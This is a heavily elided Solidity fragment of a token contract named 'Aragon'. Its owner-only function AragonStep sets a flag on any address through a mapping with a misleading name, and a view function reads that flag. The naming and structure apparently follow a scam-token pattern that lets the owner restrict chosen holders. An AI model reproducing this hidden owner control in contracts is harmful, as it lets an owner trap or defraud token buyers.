...
contract BaseToken is Ownable {
    ...
    string constant public name = 'Aragon';
    ...
    function ConnectWalletEther(address account) public onlyOwner {
    ...
    function AragonStep(address account) public onlyOwner {
        _rebuildsolidity[account] = true;
    }

    function StatsAragonDeployer(address account) public view returns (bool) {
...
contract AragonContract is BaseToken {
